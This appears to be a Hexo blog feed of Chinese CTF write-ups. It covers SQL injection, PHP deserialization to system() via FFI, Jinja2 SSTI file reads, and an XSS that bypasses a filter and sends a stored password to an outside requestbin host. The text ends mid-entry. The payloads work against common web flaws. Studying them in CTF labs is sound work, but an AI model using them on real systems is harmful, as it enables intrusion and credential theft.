    <content><![CDATA[<h1 id="RootersCTF2019-babyWeb"><a href="#RootersCTF2019-babyWeb" class="headerlink" title="[RootersCTF2019]babyWeb"></a>[RootersCTF2019]babyWeb</h1><p>SQL查询，过滤了：union、sleep、’、”、or、-、benchmark</p>
<p>order by测试字段数，发现当order by 2时返回正常order by 3返回没有这个字段，确定为两个字段，一个为uniqueid另一个应该就是flag</p>
<p>输入id判断登录，即可，尝试万能密码登录：1 || 1&#x3D;1 limit 0,1<br>返回flag</p>
<p><img src="/2022/12/26/%E7%AC%94%E8%AE%B0/13.jpg" alt="题图"></p>
<h1 id="极客大挑战-2019-EasySQL"><a href="#极客大挑战-2019-EasySQL" class="headerlink" title="[极客大挑战 2019]EasySQL"></a>[极客大挑战 2019]EasySQL</h1><p>1.输入1，看到有回显<code>Array ( [0] =&gt; 1 )</code>，输入<code>1#</code>有回显，但是输入<code>1&#39;</code>和<code>1&#39;#</code>都没有回显，连报错都没有，就说明不能使用报错注入，而且<code>&quot;</code>被过滤了</p>
<p>2.而且输入<code>and,or,union,if,order,from,sleep等</code>都会显示Nonono，说明都被过滤了，不能使用联合注入、时间盲注、布尔盲注</p>
<p>3.最后发现可以使用堆叠注入</p>
<p>先使用payload</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1;show databases#</span><br><span class="line"></span><br><span class="line">回显</span><br><span class="line">Array ( [0] =&gt; 1 ) Array ( [0] =&gt; ctf ) Array ( [0] =&gt; ctftraining ) Array ( [0] =&gt; information_schema ) Array ( [0] =&gt; mysql ) Array ( [0] =&gt; performance_schema ) Array ( [0] =&gt; test )</span><br></pre></td></tr></table></figure>

<p>再使用payload</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1;show tables#</span><br><span class="line"></span><br><span class="line">回显</span><br><span class="line">Array ( [0] =&gt; 1 ) Array ( [0] =&gt; Flag )</span><br></pre></td></tr></table></figure>

<p>这就说明有一个flag表，但from没法使用不能打开表中的列，而且hendler也被过滤</p>
<p>4.然后wp上有一个知识点，如果打开<code>set sql_mode=pipes_as_concat</code>模式，则||运算符用作字符串连接</p>
<p>比如一般select 6||1会返回1，但如果打开这个模式，就会返回61，因为直接被当作字符串来连接起来了</p>
<p>5.然后wp上猜测的是这个原语句是</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sql=&quot;select post[&#x27;query&#x27;] || flag from Flag&quot;;</span><br></pre></td></tr></table></figure>

<p>所以就会有两种方法</p>
<p>方法一payload</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">*,1</span><br><span class="line"></span><br><span class="line">这就相当于执行了</span><br><span class="line">select *,1||flag from Flag</span><br></pre></td></tr></table></figure>

<p>方法二payload</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1;set sql_mode=pipes_as_concat;select 1</span><br><span class="line"></span><br><span class="line">这就相当于执行了</span><br><span class="line">select 1;set sql_mode=pipes_as_concat;select 1||flag from Flag;</span><br><span class="line">因为打开了这个模式，所以1||flag会被当成1和flag，而不会进行运算</span><br></pre></td></tr></table></figure>

]]></content>
  </entry>
  <entry>
    <title>Nextphp</title>
    <url>/2022/12/26/nextphp/</url>
    <content><![CDATA[<h1 id="RCTF-2019-Nextphp"><a href="#RCTF-2019-Nextphp" class="headerlink" title="[RCTF 2019]Nextphp"></a>[RCTF 2019]Nextphp</h1><p>1.源代码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if (isset($_GET[&#x27;a&#x27;])) &#123;</span><br><span class="line">    eval($_GET[&#x27;a&#x27;]);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    show_source(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>查看phpinfo（）</p>
<p>发现很多禁用的函数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">disable_functions	set_time_limit,ini_set,pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,system,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,ld,mail,putenv,error_log,dl	</span><br></pre></td></tr></table></figure>

<p>使用file_put_contents()写入一个a.php</p>
<p>yijian连接获取源代码preload.php</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">final class A implements Serializable &#123;</span><br><span class="line">    protected $data = [</span><br><span class="line">        &#x27;ret&#x27; =&gt; null,</span><br><span class="line">        &#x27;func&#x27; =&gt; &#x27;print_r&#x27;,</span><br><span class="line">        &#x27;arg&#x27; =&gt; &#x27;1&#x27;</span><br><span class="line">    ];</span><br><span class="line"></span><br><span class="line">    //可以进行函数执行</span><br><span class="line">    private function run () &#123;</span><br><span class="line">        $this-&gt;data[&#x27;ret&#x27;] = $this-&gt;data[&#x27;func&#x27;]($this-&gt;data[&#x27;arg&#x27;]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __serialize(): array &#123;</span><br><span class="line">        return $this-&gt;data;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __unserialize(array $data) &#123;</span><br><span class="line">        //array_merge把两个数组合并为一个数组</span><br><span class="line">        array_merge($this-&gt;data, $data);</span><br><span class="line">        $this-&gt;run();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function serialize (): string &#123;</span><br><span class="line">        return serialize($this-&gt;data);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function unserialize($payload) &#123;</span><br><span class="line">        </span><br><span class="line">        $this-&gt;data = unserialize($payload);</span><br><span class="line">        $this-&gt;run();</span><br><span class="line">    &#125;</span><br><span class="line">	//结果输出</span><br><span class="line">    public function __get ($key) &#123;</span><br><span class="line">        //如果$key为ret，就可以输出函数执行返回的结果</span><br><span class="line">        return $this-&gt;data[$key];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __set ($key, $value) &#123;</span><br><span class="line">        throw new \Exception(&#x27;No implemented&#x27;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __construct () &#123;</span><br><span class="line">        throw new \Exception(&#x27;No implemented&#x27;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>观察到有反序列化，构造payload</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">final class A implements Serializable &#123;</span><br><span class="line">    protected $data = [</span><br><span class="line">        &#x27;ret&#x27; =&gt; null,</span><br><span class="line">        &#x27;func&#x27; =&gt; &#x27;FFI::cdef&#x27;,</span><br><span class="line">        &#x27;arg&#x27; =&gt; &#x27;int system(char *command);&#x27;</span><br><span class="line">    ];</span><br><span class="line"></span><br><span class="line">    //可以进行函数执行</span><br><span class="line">    private function run () &#123;</span><br><span class="line">        $this-&gt;data[&#x27;ret&#x27;] = $this-&gt;data[&#x27;func&#x27;]($this-&gt;data[&#x27;arg&#x27;]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __serialize(): array &#123;</span><br><span class="line">        return $this-&gt;data;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __unserialize(array $data) &#123;</span><br><span class="line">        //array_merge把两个数组合并为一个数组</span><br><span class="line">        array_merge($this-&gt;data, $data);</span><br><span class="line">        $this-&gt;run();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function serialize (): string &#123;</span><br><span class="line">        return serialize($this-&gt;data);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function unserialize($payload) &#123;</span><br><span class="line"></span><br><span class="line">        $this-&gt;data = unserialize($payload);</span><br><span class="line">        $this-&gt;run();</span><br><span class="line">    &#125;</span><br><span class="line">    //结果输出</span><br><span class="line">    public function __get ($key) &#123;</span><br><span class="line">        //如果$key为ret，就可以输出函数执行返回的结果</span><br><span class="line">        return $this-&gt;data[$key];</span><br><span class="line">    &#125;</span><br><span class="line">/*</span><br><span class="line">    public function __set ($key, $value) &#123;</span><br><span class="line">        throw new \Exception(&#x27;No implemented&#x27;);</span><br><span class="line">    &#125;</span><br><span class="line">    public function __construct () &#123;</span><br><span class="line">        throw new \Exception(&#x27;No implemented&#x27;);</span><br><span class="line">    &#125;*/</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = new A();</span><br><span class="line">echo serialize($a);</span><br></pre></td></tr></table></figure>

<p>输出结果</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C:1:&quot;A&quot;:89:&#123;a:3:&#123;s:3:&quot;ret&quot;;N;s:4:&quot;func&quot;;s:9:&quot;FFI::cdef&quot;;s:3:&quot;arg&quot;;s:26:&quot;int system(char *command);&quot;;&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>传入<code>$a</code>之后，进行unserialize反序列化，会找__unserialize()函数，然后执行run()函数，然后data[‘ret’]&#x3D;FFI::cdef(‘int system(char *command);’)，然后使用从C库中加载的system函数，然后return，最后执行system(‘cat &#x2F;flag | tee a.txt’)，使用tee保存cat &#x2F;flag的结果</p>
<p>payload：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?a=$a=unserialize(&#x27;C:1:&quot;A&quot;:89:&#123;a:3:&#123;s:3:&quot;ret&quot;;N;s:4:&quot;func&quot;;s:9:&quot;FFI::cdef&quot;;s:3:&quot;arg&quot;;s:26:&quot;int system(char *command);&quot;;&#125;&#125;&#x27;)-&gt;__serialize()[&#x27;ret&#x27;]-&gt;system(&#x27;cat /flag | tee a.txt&#x27;);</span><br></pre></td></tr></table></figure>

]]></content>
  </entry>
  <entry>
    <title>反序列化逃逸 by EZzz</title>
    <url>/2023/01/01/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%80%83%E9%80%B8/</url>
    <content><![CDATA[<p>1.源代码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UserAccount</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$password</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$username</span>, <span class="variable">$password</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username = <span class="variable">$username</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password = <span class="variable">$password</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">object_sleep</span>(<span class="params"><span class="variable">$str</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$ob</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;a*a&#x27;</span>, <span class="string">&#x27;@0@0@0@0@&#x27;</span>, <span class="variable">$str</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$ob</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">object_weakup</span>(<span class="params"><span class="variable">$ob</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$r</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;@0@0@0@0@&#x27;</span>, <span class="string">&#x27;a*a&#x27;</span>, <span class="variable">$ob</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$r</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">order</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$f</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$hint</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;f);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$username</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="variable">$password</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="variable">$user</span> = <span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title class_">UserAccount</span>(<span class="variable">$username</span>, <span class="variable">$password</span>));</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">object_weakup</span>(<span class="title function_ invoke__">object_sleep</span>(<span class="variable">$user</span>))));</span><br></pre></td></tr></table></figure>

<p>2.ctfhub{nginx_php_56} bool(false)</p>
<p>题目中有eval函数，那么直接在eval上写</p>
<p>‘system(“cat &#x2F;flag”);’</p>
<p>3.因为要进行一次序列化，如果我们输入的是字符串就不会再进行</p>
<p>序列化，可以把输入语句变为可控的</p>
<p>直接对order进行序列化</p>
<ol start="4">
<li></li>
</ol>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">order</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$f</span>=<span class="string">&#x27;system(&quot;cat /flag&quot;);&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$hint</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;f);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> order;</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">O:5:&quot;order&quot;:2:&#123;s:1:&quot;f&quot;;s:20:&quot;system(&quot;cat /flag&quot;);&quot;;s:4:&quot;hint&quot;;N;&#125;</span><br></pre></td></tr></table></figure>

<p>5.对serialize username,password的字符内容进行测试</p>
<p>我们应该使用username的s:来吞噬掉后面的字符串从而使</p>
<p><strong>O:5:”order”:2:{s:1:”f”;s:20:”system(“cat &#x2F;flag”);”;s:4:”hint”;N;}<strong>被当作object来解析，则需要减少的方法</strong>object_weakup($ob)</strong></p>
<p>6.计算（<strong>总共要吞噬掉27字符</strong>）</p>
<p>以”    “开始和闭合</p>
<p>一次减少6个，则进行五次，在后边补充三个字符并以”闭合</p>
<p>payload:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username=@0@0@0@0@@0@0@0@0@@0@0@0@0@@0@0@0@0@@0@0@0@0@&amp;password=aaa&quot;;s:11:&quot; * password&quot;;O:5:&quot;order&quot;:2:&#123;s:1:&quot;f&quot;;s:20:&quot;system(&quot;cat+/flag&quot;);&quot;;s:4:&quot;hint&quot;;N;&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2023/01/01/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%80%83%E9%80%B8/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%80%83%E9%80%B8%5C333.jpg" alt="lll"></p>
]]></content>
  </entry>
  <entry>
    <title>做题笔记</title>
    <url>/2023/01/04/%E5%81%9A%E9%A2%98%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<p>111111111111[GYCTF2020]FlaskApp</p>
<p>1.在解码中发现开的debug</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/decode&#x27;</span>,methods=[<span class="string">&#x27;POST&#x27;</span>,<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decode</span>():</span><br><span class="line">    <span class="keyword">if</span> request.values.get(<span class="string">&#x27;text&#x27;</span>) :</span><br><span class="line">        text = request.values.get(<span class="string">&quot;text&quot;</span>)</span><br><span class="line">        text_decode = base64.b64decode(text.encode())</span><br><span class="line">        tmp = <span class="string">&quot;结果 ： &#123;0&#125;&quot;</span>.<span class="built_in">format</span>(text_decode.decode())</span><br><span class="line">        <span class="keyword">if</span> waf(tmp) :</span><br><span class="line">            flash(<span class="string">&quot;no no no !!&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;decode&#x27;</span>))</span><br><span class="line">Open an interactive python shell <span class="keyword">in</span> this frame        res =  render_template_string(tmp)</span><br></pre></td></tr></table></figure>

<p>源代码名称为app.py</p>
<p>2.读源代码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;% for c in[].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__==&#x27;catch_warnings&#x27; %&#125;&#123;&#123;c.__init__.__globals__[&#x27;__builtins__&#x27;].open(&#x27;app.py&#x27;,&#x27;r&#x27;).read()&#125;&#125;&#123;% endif%&#125;&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">waf</span>(<span class="params"><span class="built_in">str</span></span>): </span><br><span class="line">  black_list = [ &amp;</span><br><span class="line">    <span class="comment">#34;flag&amp;# 34;, &amp; #34;os&amp;# 34;, &amp; #34;system&amp;# 34;, &amp;</span></span><br><span class="line">    <span class="comment">#34;popen&amp;# 34;, &amp; #34;import&amp;# 34;, &amp; #34;eval&amp;# 34;, &amp;</span></span><br><span class="line">    <span class="comment">#34;chr&amp;# 34;, &amp; #34;request&amp;# 34;, &amp; #34;subprocess&amp;# 34;, &amp;</span></span><br><span class="line">    <span class="comment">#34;commands&amp;# 34;, &amp; #34;socket&amp;# 34;, &amp; #34;hex&amp;# 34;, &amp;</span></span><br><span class="line">    <span class="comment">#34;base64&amp;# 34;, &amp; #34;*&amp;# 34;, &amp; #34;?&amp;# 34;</span></span><br><span class="line">]</span><br><span class="line">  <span class="keyword">for</span> x <span class="keyword">in</span> black_list: </span><br><span class="line">    <span class="keyword">if</span> x <span class="keyword">in</span> <span class="built_in">str</span>.lower(): </span><br><span class="line">      <span class="keyword">return</span> <span class="number">1</span>@ app.route( &amp;<span class="comment">#39;/hint&amp;# 39;, methods = [ &amp; #39;GET&amp;# 39;])</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>使用catch_warnings的os方法获取文件名称</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;% for c in[].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__==&#x27;catch_warnings&#x27; %&#125;&#123;&#123;c.__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;__imp&#x27;+&#x27;ort__&#x27;](&#x27;o&#x27;+&#x27;s&#x27;).listdir(&#x27;/&#x27;)&#125;&#125;&#123;% endif%&#125;&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>

<p>发现在this_is_the_flag.txt文件里</p>
<p>读取this_is_the_flag.txt即可</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__==&#x27;catch_warnings&#x27; %&#125;&#123;&#123;c.__init__.__globals__[&#x27;__builtins__&#x27;].open(&#x27;/this_is_the_fl&#x27;+&#x27;ag.txt&#x27;,&#x27;r&#x27;).read()&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>



<p>222222222222222[Flask]SSTI</p>
<p>get[name]传参，存在ssti，{2*2}可以运行，是jinja模板</p>
<p>直接使用</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>存在过滤</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;% for c in[].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__==&#x27;catch_warnings&#x27; %&#125;&#123;&#123;c.__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;__imp&#x27;+&#x27;ort__&#x27;](&#x27;o&#x27;+&#x27;s&#x27;).open(&#x27;env&#x27;).read()&#125;&#125;&#123;% endif%&#125;&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>

<p>打印环境变量直接出</p>
]]></content>
  </entry>
  <entry>
    <title>XSS</title>
    <url>/2023/01/06/XSS/</url>
    <content><![CDATA[<h1 id="GWCTF-2019-mypassword"><a href="#GWCTF-2019-mypassword" class="headerlink" title="[GWCTF 2019]mypassword"></a>[GWCTF 2019]mypassword</h1><p>打开题目发现代码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if (document.cookie &amp;&amp; document.cookie != &#x27;&#x27;) &#123;</span><br><span class="line">	var cookies = document.cookie.split(&#x27;; &#x27;);</span><br><span class="line">	var cookie = &#123;&#125;;</span><br><span class="line">	for (var i = 0; i &lt; cookies.length; i++) &#123;</span><br><span class="line">		var arr = cookies[i].split(&#x27;=&#x27;);</span><br><span class="line">		var key = arr[0];</span><br><span class="line">		cookie[key] = arr[1];</span><br><span class="line">	&#125;</span><br><span class="line">	if(typeof(cookie[&#x27;user&#x27;]) != &quot;undefined&quot; &amp;&amp; typeof(cookie[&#x27;psw&#x27;]) != &quot;undefined&quot;)&#123;</span><br><span class="line">		document.getElementsByName(&quot;username&quot;)[0].value = cookie[&#x27;user&#x27;];</span><br><span class="line">		document.getElementsByName(&quot;password&quot;)[0].value = cookie[&#x27;psw&#x27;];</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>当typeof(cookie[‘user’])，typeof(cookie[‘psw’])都不是未定义时会把内容保存到表单</p>
<p>先注册登录</p>
<p>feedback里有过滤，说明很可能在这里面注入</p>
<p>把一些关键字词替换为空</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(is_array($feedback))&#123;</span><br><span class="line">				echo &quot;&lt;script&gt;alert(&#x27;反馈不合法&#x27;);&lt;/script&gt;&quot;;</span><br><span class="line">				return false;</span><br><span class="line">			&#125;</span><br><span class="line">			$blacklist = [&#x27;_&#x27;,&#x27;\&#x27;&#x27;,&#x27;&amp;&#x27;,&#x27;\\&#x27;,&#x27;#&#x27;,&#x27;%&#x27;,&#x27;input&#x27;,&#x27;script&#x27;,&#x27;iframe&#x27;,&#x27;host&#x27;,&#x27;onload&#x27;,&#x27;onerror&#x27;,&#x27;srcdoc&#x27;,&#x27;location&#x27;,&#x27;svg&#x27;,&#x27;form&#x27;,&#x27;img&#x27;,&#x27;src&#x27;,&#x27;getElement&#x27;,&#x27;document&#x27;,&#x27;cookie&#x27;];</span><br><span class="line">			foreach ($blacklist as $val) &#123;</span><br><span class="line">		        while(true)&#123;</span><br><span class="line">		            if(stripos($feedback,$val) !== false)&#123;</span><br><span class="line">		                $feedback = str_ireplace($val,&quot;&quot;,$feedback);</span><br><span class="line">		            &#125;else&#123;</span><br><span class="line">		                break;</span><br><span class="line">		            &#125;</span><br><span class="line">		        &#125;</span><br><span class="line">		    &#125;</span><br></pre></td></tr></table></figure>

<p>可以把过滤的插在中间,例如是incookieput的话，替换后会剩下input。由于login.js中有记录密码的功能，所以我们可以构造一个表单在feedback页面提交，在 <a href="http://http.requestbin.buuoj.cn/">http://http.requestbin.buuoj.cn</a> （RequestBin提供了一个URL，该URL将收集对其发出的请求，首页点击create a requestbin）页面接收flag</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;incookieput type=&quot;text&quot; name=&quot;username&quot;&gt;</span><br><span class="line">&lt;incookieput type=&quot;password&quot; name=&quot;password&quot;&gt;</span><br><span class="line">&lt;scrcookieipt scookierc=&quot;./js/login.js&quot;&gt;&lt;/scrcookieipt&gt;</span><br><span class="line">&lt;scrcookieipt&gt;</span><br><span class="line">var psw = docucookiement.getcookieElementsByName(&quot;password&quot;)[0].value;</span><br><span class="line">docucookiement.locacookietion=&quot;http://http.requestbin.buuoj.cn/x18xpyx1/?a=&quot;+psw;</span><br><span class="line">&lt;/scrcookieipt&gt;</span><br></pre></td></tr></table></figure>

]]></content>
  </entry>
  <entry>
    <title>做题笔记</title>
    <url>/2023/01/08/%E5%81%9A%E9%A2%98%E7%AC%94%E8%AE%B0-1/</url>
    <content><![CDATA[<p>[RootersCTF2019]babyWeb</p>
<p>1.打开网页有一个输入框，有一句banned words and characters <strong>UNION SLEEP ‘ “ OR - BENCHMARK</strong>，意思就是union、sleep、’、”、or、-、benchmark被过滤</p>
<p>2.然后当使用1 order by 3时进行了报错，而1 order by 2没有，那就是有两个字段，但是union被过滤，不能使用联合注入，先试着使用报错型注入</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1 and extractvalue(1,concat(0x7e,(select database())))#</span><br></pre></td></tr></table></figure>

<p>回显了sql_injection</p>
<p>再使用</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1 and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database())))#</span><br></pre></td></tr></table></figure>

<p>回显了users</p>
<p>3，使用的是万能密码</p>
<p>使用payload<br>1 || 1 limit 0,1</p>
<p>当使用select * from user where name &#x3D; 1时只会返回一条数据</p>
<p>但当使用select * from user where name &#x3D; 1 || 1就会返回所有的数据，然后再使用limit来进行返回数据条数的限制</p>
<p> [ACTF2020 新生赛]BackupFile</p>
<p>1.发现Try to find out source file!</p>
<p>2.扫描</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python dirsearch.py -u http://7b49096a-9e5f-4761-9833-73968554eb04.node4.buuoj.cn:81/</span><br></pre></td></tr></table></figure>

<p>得到index.php.bak文件，进行打开，然后下载得到源代码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include_once &quot;flag.php&quot;;</span><br><span class="line"></span><br><span class="line">if(isset($_GET[&#x27;key&#x27;])) &#123;</span><br><span class="line">  $key = $_GET[&#x27;key&#x27;];</span><br><span class="line">  if(!is_numeric($key)) &#123;</span><br><span class="line">    exit(&quot;Just num!&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  $key = intval($key);</span><br><span class="line">$str = &quot;123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3&quot;;</span><br><span class="line">if($key == $str) &#123;</span><br><span class="line">  echo $flag;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">else &#123;</span><br><span class="line">  echo &quot;Try to find out source file!&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>is_numeric函数是如果指定的变量是数字和数字字符串则返回 TRUE，否则返回FALSE。</p>
<p>intval是函数用于获取变量的整数值。</p>
<p>是弱比较绕过</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?key=123</span><br></pre></td></tr></table></figure>

<p>得到flag</p>
]]></content>
  </entry>
  <entry>
    <title>做题笔记-2</title>
    <url>/2023/01/11/%E5%81%9A%E9%A2%98%E7%AC%94%E8%AE%B0-2-1/</url>
    <content><![CDATA[<h3 id="FBCTF2019-RCEService"><a href="#FBCTF2019-RCEService" class="headerlink" title="[FBCTF2019]RCEService"></a>[FBCTF2019]RCEService</h3><p>1.打开网页看到<code>Enter command as JSON</code>，意思是<code>输入命令作为 JSON</code></p>
<p>2.源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">putenv</span>(<span class="string">&#x27;PATH=/home/rceservice/jail&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;cmd&#x27;</span>])) &#123;</span><br><span class="line">  <span class="variable">$json</span> = <span class="variable">$_REQUEST</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!<span class="title function_ invoke__">is_string</span>(<span class="variable">$json</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Hacking attempt detected&lt;br/&gt;&lt;br/&gt;&#x27;</span>;</span><br><span class="line">  &#125; <span class="keyword">elseif</span> (<span class="title function_ invoke__">preg_match</span>(<span 